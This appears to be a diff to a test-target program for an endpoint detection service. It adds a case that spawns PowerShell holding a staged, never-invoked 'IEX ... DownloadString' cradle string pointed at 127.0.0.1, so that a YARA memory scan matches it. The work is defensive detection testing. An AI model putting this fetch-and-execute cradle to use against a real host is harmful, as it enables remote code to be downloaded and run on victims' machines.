@@ -534,6 +534,42 @@ static void TriggerUnbackedSyscall(void) {
     VirtualFree(Stub, 0, MEM_RELEASE);
 }
 
+//
+// Spawns a PowerShell process whose script text contains a download-cradle
+// string, then leaves it idling. Script-block logging raises an event carrying
+// that process's PID, the service scans its memory, and the YARA rule matches
+// the staged text inside powershell.exe.
+//
+// The cradle is a string literal that is assigned and never invoked, and it
+// points at 127.0.0.1 - nothing is fetched and nothing is executed.
+//
+static void TriggerYaraMemoryScan(void) {
+    WCHAR CommandLine[] =
+        L"powershell.exe -NoProfile -NonInteractive -Command "
+        L"\"$Cradle = 'IEX(New-Object Net.WebClient).DownloadString("
+        L"''http://127.0.0.1/payload.ps1'')'; "
+        L"Write-Output 'staged, idling for the scan'; "
+        L"Start-Sleep -Seconds 30\"";
+
+    STARTUPINFOW        StartupInfo = { sizeof(StartupInfo) };
+    PROCESS_INFORMATION ProcessInfo = {};
+
+    printf("[target] spawning PowerShell with a staged cradle string...\n");
+
+    if (!CreateProcessW(nullptr, CommandLine, nullptr, nullptr, FALSE,
+            CREATE_NEW_CONSOLE, nullptr, nullptr, &StartupInfo, &ProcessInfo)) {
+        printf("[target] CreateProcessW failed: %lu\n", GetLastError());
+        return;
+    }
+
+    printf("[target] powershell pid=%lu - it idles 30s so the scan can reach it\n",
+        ProcessInfo.dwProcessId);
+    printf("[target] expect a scan record for THAT pid, not this one\n");
+
+    CloseHandle(ProcessInfo.hThread);
+    CloseHandle(ProcessInfo.hProcess);
+}
+
 static void PrintMenu(void) {
     printf("\n");
     printf("[target] ----------------------------------------\n");
@@ -546,6 +582,7 @@ static void PrintMenu(void) {
     printf("[target]  7) Trigger VEH chain walk    (VEH_EVENT, id 3)\n");
     printf("[target]  8) Scan module code via PEB  (KILLS: decoy guard page)\n");
     printf("[target]  9) Direct syscall from RWX   (KILLS: unbacked target)\n");
+    printf("[target] 10) PowerShell cradle string (YARA memory scan)\n");
     printf("[target]  0) Exit\n");
     printf("[target] ----------------------------------------\n");
     printf("[target] choice: ");
@@ -630,6 +667,10 @@ int main(void) {
 
         case 9:
             TriggerUnbackedSyscall();
+            break;
+
+        case 10:
+            TriggerYaraMemoryScan();
             break;
 
         case 0:
